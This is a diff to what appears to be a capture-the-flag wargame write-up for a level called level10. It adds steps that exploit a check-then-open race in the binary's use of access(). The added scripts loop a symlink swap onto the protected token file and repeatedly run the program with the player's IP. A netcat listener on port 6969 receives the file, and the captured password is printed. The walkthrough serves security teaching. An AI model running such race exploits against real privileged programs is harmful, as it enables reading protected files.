@@ -57,9 +57,9 @@
 
 6. __Observation__ (Host): the RetDec decompiler reveals that the
 	`level10` file takes two arguments, a `file` and a `host`
-	- a check is done using `access`
-	- if the passed file is valid, a TCP socket is created and the file is
-	sent to the client
+	- a check on the `file` is done using `access`
+	- if the passed file is valid, a connection on the port `6969` is opened,
+    a TCP socket is created and the file is sent to the client
 	```c
 	// ------------------------ Functions -------------------------
 
@@ -145,3 +145,45 @@
 	because the user might exploit the short time interval between checking and
 	opening the file to manipulate it.
 	```
+7. __Action__ (Guest): exploit the vulnerability of the `access` command to get
+    the password
+    To exploit this vulnerability, we need to swap a file we have the rights to
+    with the `token` file we'll pass to the program.
+    In order to do so, we need two bash scripts.
+    The first script, continuously creates a symbolic link between the `token`
+    file and our file.
+    ```sh
+    #!/bin/bash
+
+    while true; do
+        touch /tmp/file     # maybe remove
+        rm -rf /tmp/file    # maybe remove
+        ln -s /home/user/level10/token /tmp/file
+        rm -rf /tmp/file
+    done
+    ```
+    The second script continously launches the program with our file and our
+    IP address as parameters.
+    ```sh
+    #!/bin/bash
+
+    while true; do
+        /home/user/level10/level10 /tmp/file 192.168.56.101
+    done
+    ```
+    Once the two scripts are launched, we need to open a third terminal to
+    listen on the port `6969`
+    ```sh
+    nc -lk 6969
+    ```
+
+8. __Observation__ (Guest): the password is displayed on stdout
+    ```
+    .*( )*.
+    .*( )*.
+    .*( )*.
+    woupa2yuojeeaaed06riuj63c
+    .*( )*.
+    .*( )*.
+    .*( )*.
+    ```
